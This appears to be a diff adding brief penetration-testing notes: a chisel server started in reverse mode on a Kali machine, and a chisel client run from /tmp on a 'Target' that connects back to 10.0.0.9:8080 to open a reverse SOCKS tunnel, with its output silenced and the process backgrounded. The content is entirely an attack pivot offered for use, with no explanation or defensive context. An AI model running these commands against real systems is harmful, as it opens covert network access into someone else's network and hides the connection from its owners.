@@ -1,0 +1,8 @@
+
+
+
+# Kali:
+chisel server --port 8080 --reverse
+
+# Target:
+/tmp/chisel client 10.0.0.9:8080 R:socks > /dev/null 2>&1 &
